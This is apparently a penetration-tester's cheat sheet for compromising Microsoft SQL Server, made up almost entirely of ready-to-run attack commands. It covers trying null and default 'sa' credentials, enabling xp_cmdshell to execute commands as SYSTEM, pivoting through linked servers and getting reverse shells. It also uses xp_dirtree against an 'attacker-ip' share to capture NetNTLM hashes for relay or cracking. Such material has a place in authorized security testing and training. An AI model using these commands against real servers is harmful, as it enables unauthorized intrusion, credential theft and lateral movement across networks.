# MSSQL Battle Card

## What to Check First
```
1. PORT 1433? → nmap -sV -p 1433 target
2. SERVICE DETECT → nmap --script ms-sql-info -p 1433 target
3. NULL SA? → impacket-mssqlclient target -db master -windows-auth
4. DEFAULT SA? → impacket-mssqlclient sa:sa@target
5. ENUM → netexec mssql target -u sa -p sa
```

## High-Value Findings
- **Default SA password** → SA = sysadmin = full DB + xp_cmdshell
- **Linked SQL servers** → Move to linked server = lateral movement
- **Windows auth + local admin** → xp_cmdshell as SYSTEM
- **MSSQL as domain user** → DB access + potential privilege escalation
- **xp_cmdshell enabled** → Immediate command execution
- **MSSQL in high-integrity** → Potential SYSTEM via xp_cmdshell
- **Linked server to another SQL server** → Lateral movement path

## Immediate Commands
```
# Connect
impacket-mssqlclient domain/user:pass@target -db master -windows-auth
impacket-mssqlclient sa:password@target -db master

# Enable xp_cmdshell (if you have sa/admin)
EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

# Check if sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin;

# List databases
SELECT name FROM sys.databases;

# Check linked servers
EXEC sp_linkedservers;
EXEC sp_help_linkedsrvlogin;

# Execute on linked server
EXEC ('SELECT current_user') AT [linkedserver];

# Netexec enumeration
netexec mssql target -u user -p pass -M xp_cmdshell
netexec mssql target -u user -p pass --query "SELECT @@version"

# Capture hash (responder relay)
EXEC xp_dirtree '\\attacker-ip\share'
```

## Common Attack Paths
```
NULL SA → SA → xp_cmdshell → SYSTEM Shell → Full Control
DEFAULT CREDS → SA → xp_cmdshell → SYSTEM Shell → Lateral
WINDOWS AUTH + SYSADMIN → xp_cmdshell → SYSTEM Shell
MSSQL LINKED SERVER → Jump to Linked → Broader Access
MSSQL xp_dirtree → Hash Capture → Relay/Crack
MSSQL + HASHED CREDS → Crack → Database Access → RCE
```

## Escalation Paths
- **SA access** → xp_cmdshell → SYSTEM (if running as SYSTEM)
- **SA access** → Enable xp_cmdshell → Reverse shell
- **Linked server** → Jump to linked instance → Pivot
- **xp_dirtree** → NetNTLM hash capture → Relay or crack
- **DB user with sysadmin** → Full SQL Server control

## When to Stop
- Default SA fails, no other creds, no linked servers → Move on
- xp_cmdshell disabled and SA not available → Can't get RCE

## Common Mistakes
- Not trying `null` or `sa:sa` as first auth attempt
- Forgetting to check linked servers (major missed opportunity)
- Not enabling xp_cmdshell as first step when SA
- Missing xp_dirtree hash capture (free hash!)
- Assuming MSSQL runs as SYSTEM (check with xp_cmdshell whoami)
- Not using `-windows-auth` flag for domain connection
